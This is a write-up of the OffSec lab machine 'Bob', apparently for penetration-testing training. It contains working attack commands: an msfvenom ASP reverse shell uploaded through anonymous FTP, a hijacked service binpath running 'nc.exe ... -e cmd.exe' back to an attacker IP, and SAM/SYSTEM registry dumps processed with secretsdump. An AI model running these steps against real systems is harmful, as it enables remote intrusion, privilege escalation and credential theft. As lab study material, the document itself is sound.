---
title: "OffSec - Bob"
slug: "offsec-bob"
date: "2024-03-14"
excerpt: ""
cover: "cover.png"
tags:
  - 
---

## Enumeration
### NMAP

```bash
nmap -sC -sV -v -T4 -oN scans/nmap.txt 10.11.1.14
```

```text
PORT    STATE  SERVICE VERSION
21/tcp  open   ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 01-17-07  07:42PM       <DIR>          AdminScripts
| 01-17-07  07:43PM       <DIR>          ftproot
| 01-17-07  07:43PM       <DIR>          iissamples
| 01-17-07  07:43PM       <DIR>          Scripts
|_04-16-16  10:42AM       <DIR>          wwwroot
23/tcp  closed telnet
25/tcp  closed smtp
80/tcp  open   http    Microsoft IIS httpd 5.1
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/5.1
|_  Server Date: Tue, 02 Aug 2022 06:53:45 GMT
|_http-server-header: Microsoft-IIS/5.1
110/tcp closed pop3
443/tcp open   https?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### FTP

Anonymous FTP is enabled.

```bash
ftp anonymous@10.11.1.14
```

## Shell as IUSR_BOB

Since we have write permissions to the `wwwroot` directory, we can upload an `asp` reverse shell and execute it by accessing the web page.

Let's first generate a stageless webshell.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.194 LPORT=9001 -f asp > shell.asp
```

We can then upload the shell via FTP.

![](././20220802185040.png)  

Setup a `netcat` listener to catch our shell.

```bash
rlwrap nc -lnvp 9001
```

Then using `curl` we can execute the shell.

![](././20220802185218.png)  

## Privilege Escalation

### Upload Tools

We don't have `whoami` on the target so let's upload it. We can use FTP for this.

```bash
cp /usr/share/windows-binaries/whoami.exe ./ 
```

![](././20220802185354.png)  

```powershell
.\whoami.exe /all
```

![](././20220802202740.png)  

Let's also upload and run `accesschk.exe` to help enumerate permissions and services.

```bash
cp /usr/share/windows-binaries/accesschk.exe ./
```

### Enumeration

```powershell
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

![](././20220802205609.png)  

This tells us that we have access to two services, and that we're able to edit the `upnphost` and `SSDPSRV` service parameters.

```powershell
.\accesschk.exe /accepteula -ucqv SSDPSRV
```

![](././20220802205809.png)  

We can exploit this by making the service execute a binary of our choice.

Let's look at both services. We can see that the `upnphost` service requires the `SSDPSRV` service as a dependency.

```powershell
sc qc SSDPSRV
sc qc upnphost
```

![](././20220802210000.png)  

### Exploit Services

If we look at the status of the `SSDPSRV` service we see that it's current stopped. If we try and start it we get an error.

```powershell
sc query SSDPSRV
net start SSDPSRV
```

![](././20220802221938.png)  

In order to fix this we need to change the `SSDPSRV` service `START_TYPE` from `DISABLED` to `AUTOMATIC` so we can start it.

```powershell
sc config SSDPSRV start= auto
sc qc SSDPSRV
net start SSDPSRV
```

As we can see, we're now able to start the process.

![](././20220802222442.png)  

Before we continue, we need to upload `netcat` to the target. We can use FTP again.

```bash
cp /usr/share/windows-binaries/nc.exe ./
```

We can now change the binary path of the `upnphost` service.

```powershell
sc config upnphost binpath= "c:\inetpub\wwwroot\nc.exe 192.168.119.194 9001 -e c:\windows\system32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
```

Start two a `netcat` listeners on different ports. We'll need two because the shell is unstable and will close out quickly.

```bash
rlwrap nc -lnvp 9001
```

To trigger the payload all we need to do is start the service.

```powershell
net start upnphost
```

![](././20220802222945.png)  

And we get our first shell. Then quickly execute the following to get another more stable shell.

```powershell
c:\inetpub\wwwroot\nc.exe 192.168.119.194 9002 -e c:\windows\system32\cmd.exe
```

![](././20220802223204.png)  

We can check our privileges.

![](././20220802224952.png)  

### Proof

```powershell
type proof.txt && ipconfig
```

![](././20220802230621.png)  

## Post Exploitation

### Dump Hashes

```powershell
reg.exe save hklm\sam c:\inetpub\wwwroot\sam.save
reg.exe save hklm\security c:\inetpub\wwwroot\security.save
reg.exe save hklm\system c:\inetpub\wwwroot\system.save
```

![](././20220802230003.png)  

```text
a26f37da4583ff68f44d133d12ae3459
```

We can use FTP to download the files onto our machine and get the hashes using `secretsdump`.

```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL -outputfile hashes/hashes
```

![](././20220802230942.png)  